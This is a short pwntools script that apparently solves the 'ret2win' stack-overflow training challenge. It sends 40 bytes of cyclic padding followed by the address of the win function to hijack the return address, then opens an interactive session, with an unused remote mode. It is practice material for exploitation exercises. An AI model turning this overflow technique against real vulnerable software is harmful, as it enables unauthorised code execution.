import pwn

#pwn.context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./ret2win"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf

p.recvuntil("> ")

pwn.context.bits = 64
win = pwn.pack(elf.sym["ret2win"])
payload = pwn.cyclic(40) + win
pwn.pause()
p.sendline(payload)

p.interactive()
